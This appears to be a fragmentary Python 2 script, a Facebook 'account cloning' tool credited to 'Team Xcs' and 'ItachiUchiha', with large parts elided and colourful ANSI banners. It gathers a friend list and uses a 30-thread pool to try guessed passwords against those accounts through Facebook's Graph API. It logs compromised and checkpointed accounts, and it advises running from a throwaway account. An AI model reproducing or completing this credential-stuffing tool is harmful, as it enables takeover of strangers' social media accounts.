...
\033[1;94m╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░
\033[1;94m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
\033[1;96m║✯ Author Team Xcs     ║    
\033[1;98m║✯ Name: LAWWWWWWWW   ║  
\033[1;91m║✯ username: lawwww  ║
\033[1;96m║✯ password: xcs ║
\033[1;98m║✯ Use new account not old account║
\033[1;94m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
print  """
\033[1;97m************************************************
\033[1;96m~ di ko kasalanan ang masira ang old acc nyo gamit kayo nang new account para di kayo mag sisi ~
\033[1;97m************************************************
...
\033[1;96m#################$$$$$$$$$$##################
\033[1;93mTeam Xcs
\033[1;93mAutoher: Team Xcs
\033[1;93mCode Name Law
\033[1;93mCode name ITACHI
\033[1;96m#################$$$$$$$$$$##################
\033[1;92m   Username And Password
"""
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:ItachiUchiha
	    time.sleep(2)
            loop = 'false'
        else:
...
def login():
	...
	try:
		...
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[⚡] \x1b[1;91m───Login your Facebook Account───\x1b[1;93m[⚡]' )
		...
		if 'save-device' in url:
			try:
				...
				print"\n\033[1;96m[!] \x1b[1;91mNc one"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mHmmmmmmmmmmmm")
...
def super():
	...
	os.system('clear')
	print logo
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Clone Friend List For Old account only."
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;91mItachi Uchiha\033[1;97m═══•◈•"
		...
		print "\033[1;95m•◈•══════•◈\033[1;91mXcs law\033[1;95m◈•══════•◈•"
		try:
	...
	jalan('          \033[1;91mM  -  Law start cloning Wait...')
	print  "  \033[1;92m ◄══════════════════💥══════════════════►" 
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92mAsim-Hack100%'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mPardasi-Checkpoint'
								                           ...
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								                               ...
								                               if 'access_token' in q:		
									                               ...
									                               oks.append(user+pass7)
			                                                                               ...
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;94m[ ❥ ] \x1b[1;94mPaedasi-Checkpoint'
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                           print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬•◈\033[1;91mSharingan\033[1;95m◈•▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By ItachiUchiha--•◈•---»" #Dev:Asim
...
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ..Xcs law lang malakas. \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91mXcs"""
